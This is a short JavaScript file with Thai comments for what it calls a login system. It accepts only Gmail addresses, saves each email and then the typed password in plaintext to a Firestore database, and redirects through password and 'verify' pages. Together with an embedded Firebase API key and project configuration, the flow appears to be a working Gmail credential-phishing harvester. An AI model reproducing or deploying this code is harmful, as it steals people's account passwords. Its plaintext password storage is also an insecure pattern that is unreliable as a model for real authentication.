// ✅ Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyCTgAP4Tvlri2-seayJIrC9dpwTA-avZA0",
    authDomain: "loginsystem-7f056.firebaseapp.com",
    projectId: "loginsystem-7f056",
    storageBucket: "loginsystem-7f056.appspot.com",
    messagingSenderId: "1094872135642",
    appId: "1:1094872135642:web:72419f77faf8537c36b2e3",
    measurementId: "G-NT11WXB1W3"
};

// ✅ ตรวจสอบว่า Firebase ถูกโหลดก่อนใช้งาน
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}

const db = firebase.firestore();  // Firestore Database

console.log("🔥 Firebase โหลดสำเร็จ:", firebase);
console.log("📂 Firestore Instance:", db);

// 📌 ตรวจสอบอีเมล และ ปิด/เปิดปุ่ม "ถัดไป"
function validateEmail() {
    let email = document.getElementById("email").value.trim();
    let nextButton = document.getElementById("next-btn");

    // ✅ ถ้าอีเมลลงท้ายด้วย @gmail.com ให้เปิดปุ่ม
    if (email.endsWith("@gmail.com")) {
        nextButton.disabled = false; // 🔓 เปิดใช้งานปุ่ม
    } else {
        nextButton.disabled = true; // 🔒 ปิดปุ่มถ้ายังไม่ถูกต้อง
    }
}

// 📌 ฟังก์ชันบันทึกอีเมลลง Firestore และไปหน้ารหัสผ่าน
function saveEmail() {
    let email = document.getElementById("email").value.trim();

    if (!email.endsWith("@gmail.com")) {
        return; // ❌ ไม่ให้ไปต่อถ้าอีเมลผิด
    }

    try {
        localStorage.setItem("userEmail", email);
    } catch (e) {
        console.warn("⚠️ localStorage ใช้งานไม่ได้บนเบราว์เซอร์นี้");
    }

    // ✅ บันทึกอีเมลลง Firestore
    db.collection("users").doc(email).set({
        email: email,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
    }, { merge: true })
    .then(() => {
        console.log("✅ อีเมลถูกบันทึกลง Firebase:", email);
        window.location.href = "password.html"; // ✅ ไปหน้าถัดไป
    })
    .catch(error => {
        console.error("❌ เกิดข้อผิดพลาด:", error);
    });
}

// 📌 ฟังก์ชันบันทึกรหัสผ่านลง Firestore
function savePassword() {
    let password = document.getElementById("password").value.trim();
    let email = null;

    try {
        email = localStorage.getItem("userEmail"); // ดึงค่าอีเมล
    } catch (e) {
        console.warn("⚠️ localStorage ใช้งานไม่ได้บนเบราว์เซอร์นี้");
    }

    console.log("🔑 บันทึกรหัสผ่านสำหรับ:", email);

    if (!email) {
        console.error("❌ ไม่พบอีเมล! กลับไปหน้า login");
        window.location.href = "login.html";
        return;
    }

    if (!password) {
        console.warn("⚠️ กรุณากรอกรหัสผ่าน");
        return;
    }

    // ✅ บันทึกรหัสผ่านลง Firestore
    db.collection("users").doc(email).update({
        password: password
    })
    .then(() => {
        console.log("✅ รหัสผ่านถูกบันทึกใน Firebase! ไป verify.html...");
        window.location.href = "verify.html"; // ✅ ไปหน้ายืนยันตัว
    })
    .catch(error => {
        console.error("❌ เกิดข้อผิดพลาดในการบันทึกรหัสผ่าน:", error);
    });
}

// ✅ ตรวจสอบว่า Firebase โหลดสมบูรณ์ก่อนใช้ฟังก์ชัน
document.addEventListener("DOMContentLoaded", function() {
    console.log("📌 DOM โหลดเสร็จแล้ว");
});
